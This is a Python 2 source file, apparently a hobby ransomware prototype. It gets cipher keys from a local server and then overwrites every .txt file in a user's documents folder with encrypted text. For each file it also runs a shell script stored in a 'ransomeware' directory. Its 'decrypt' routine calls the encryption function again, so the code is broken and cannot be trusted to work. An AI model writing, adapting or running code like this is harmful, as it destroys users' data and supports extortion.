import vigenerCipher,CaesarCipher2, os,subc, urllib2, urllib
from random import choice
from string import ascii_uppercase
# store key as global var so we can use it throughout the program
mykeys ='' 
# get random keys from server
def GenerateKeys():
    
 
        #send back random userID to aid in key recovery
    url = 'http://localhost:8080'
    userID = ''.join(choice(ascii_uppercase) for i in range(5))
    data = urllib.urlencode({'userID'  : userID})
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    global mykeys 
    mykeys = response.read()
    print 
    
    
    


def controller():
    
     SearchnEncrypt()
    
   
    return
    
   
   
def productCipher(message,keys):
    
    keys = keys.split(',')
    
    encryptV = vigenerCipher.translateMessage(keys[0], message, 'encrypt')
    encryptC = CaesarCipher2.caesar('encrypt', encryptV, int(keys[1]))  
    encryptS = subc.encryptMessage(keys[2], encryptC)
    
    
    
    
    return encryptS 


def decryptCipher(encryptS,keys):
    
    keys = keys.split(',')
    decryptS = subc.decryptMessage(keys[2],encryptS)
    decryptC = CaesarCipher2.caesar('decrypt', decryptS, int(keys[1]))
    decryptV = vigenerCipher.translateMessage(keys[0], decryptC, 'decrypt')  
    
    return decryptV  
    
def SearchnEncrypt():
    
    directoryTOlook = "/Users/claude/documents/"
    for file in os.listdir(directoryTOlook):
        if file.endswith(".txt"):
            
            combination = directoryTOlook + file
            fo = open(combination,'r+')
            
            
          #  str = fo.read()
            print(file)
            
            message1 = fo.read()
            
            enc1= productCipher(message1, mykeys)
            
            fo.truncate(0)

            fo.write(enc1)
            
         #   decryp = CaesarCipher2.caesar('decrypt',encyrp,55)
          #  fo.write(decryp)
            
            fo.close()
            
            os.system("sh /Users/claude/Documents/ransomeware/oscrip.sh")
            
            print file,'sucessfuly encrypted'


def searchnDecrypt():
    directoryTOlook = "/Users/claude/documents/"
    for file in os.listdir(directoryTOlook):
        if file.endswith(".txt"):
            
            combination = directoryTOlook + file
            fo = open(combination,'r+')
            
            
          
            print(file)
            
            message1 = fo.read()
            
            enc1= productCipher(message1, mykeys)
            
            fo.truncate(0)

            fo.write(enc1)
            
      
            
            fo.close()
            
            os.system("sh /Users/claude/Documents/ransomeware/oscrip.sh")
            
            print file, 'sucessful decrypted'

         
    
GenerateKeys()  
controller()


